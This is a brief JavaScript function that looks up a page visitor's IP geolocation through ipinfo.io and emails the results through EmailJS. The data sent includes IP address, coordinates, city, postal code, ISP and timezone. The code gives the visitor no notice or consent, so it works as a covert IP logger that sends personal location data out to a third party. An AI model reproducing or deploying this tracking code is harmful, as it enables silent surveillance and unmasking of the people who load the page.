const getlocation = () => {
    fetch('http://ipinfo.io/json/?callback-?')
      .then((response) => {
        if (!response.ok) {
          throw new Error(`HTTP error! Status: ${response.status}`);
        }
        return response.json();
      })
      .then((data) => {
        const geolocationData = `Latitude: ${data.loc} ip: ${data.ip}
        city: ${data.city}  country: ${data.country} state: ${data.region} postal: ${data.postal}
        network: ${data.org} timezone: ${data.timezone}
        
        `;
  
        // Use Email.js to send the geolocation data
        emailjs.send("service_qbda22d", "template_q8918fm", {
          geolocation: geolocationData,
        })
        .then(function(response) {
          console.log("Geolocation sent successfully.", response);
        }, function(error) {
          console.error("Error sending geolocation data:", error);
        });
      });
  };
  
